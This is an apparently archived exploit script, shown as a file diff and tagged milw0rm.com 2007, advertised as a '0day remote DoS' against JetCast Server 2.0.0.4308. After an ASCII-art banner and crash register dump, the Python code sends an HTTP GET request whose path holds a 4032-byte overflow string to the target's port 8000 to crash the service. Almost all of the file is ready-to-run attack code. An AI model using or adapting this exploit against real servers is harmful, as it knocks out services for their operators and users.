@@ -1,0 +1,64 @@
+#!/usr/bin/python
+"""     ____
+__   __/ ___|___  _ __ ___
+\ \ / / |   / _ \| '__/ _ \
+ \ V /| |__| (_) | | |  __/
+ \_/  \____\___/|_|  \___|     _
+ _ __  _ __ ___  ___  ___ _ __ | |_ ___   _
+| '_ \| '__/ _ \/ __|/ _ \ '_ \| __/ __| |_|
+| |_) | | |  __/\__ \  __/ | | | |_\__ \  _
+| .__/|_|  \___||___/\___|_| |_|\__|___/ |_|
+|_|        _
+      _  //
+      \\//
+GENRE: //\\PLOIT
+     //  `
+PROGRAM: JetCast Server 2.0.0.4308
+EXPLOiT TYPE: 0day remote DoS exploit
+EXPLOiT LANGUAGE: Python
+DEBUG iNFO: [Module JSMP3OGG]
+           EAX 100355B8 JSMP3OGG.100355B8
+           ECX 00000007
+           EDX 00002000
+           EBX 00CB415A
+           ESP 00DCDEC0
+           EBP 00DCDECC
+           ESI 00000000
+           EDI 1002FA64 ASCII "Mozilla"
+           EIP 1002737C JSMP3OGG.1002737C
+
+           MOV AH,BYTE PTR DS:[ESI]; C0000005 (ACCESS VIOLATION)
+
+Bug found / exploit written by vCore <share0005@o2.pl>
+Tested on JetCast Server 2.0.0.4308 - Windows XP ServicePack2
+ ____          _
+ / ___|_     __| | ___   _
+| |   / _ \ / _` |/ _ \ |_|
+| |__| (_) | (_| |  __/  _
+ \____\___/ \__,_|\___| |_|
+
+"""
+from time import sleep
+from socket import *
+
+target = '127.0.0.1'
+port = 8000
+buf = "A" * 4032
+
+header = (
+   'GET /%s.mp3 HTTP/1.0\r\n'
+   'Host: %s\r\n'
+   'User-Agent: WinampMPEG/5.19\r\n'
+   'Accept: */*\r\n'
+   'Icy-MetaData:1\r\n'
+   'Connection: close\r\n') % (buf, target)
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((target, port))
+s.send(header)
+sleep(2)
+s.close()
+
+print "DONE"
+
+# milw0rm.com [2007-09-13]
